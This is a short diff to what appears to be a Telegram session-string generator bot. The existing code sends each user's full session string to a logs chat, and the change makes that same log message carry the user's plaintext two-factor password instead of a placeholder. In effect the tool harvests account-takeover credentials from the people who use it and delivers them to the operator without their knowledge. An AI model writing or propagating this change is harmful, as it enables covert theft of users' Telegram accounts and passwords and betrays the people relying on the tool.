@@ -151,7 +151,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     f"**✨New Login ({account_type})**\n\n"
     f"**✨User ID:** [{user_info.first_name}](tg://user?id={user_info.id}) `{user_info.id}`\n\n"
     f"**✨Session String ↓**\n`{string_session}`\n"
-    f"**✨2FA Password:** `{'Set' if 'password' in locals() else 'None'}`"
+    f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
     )
     await bot.send_message(LOGS_CHAT_ID, log_message)
 
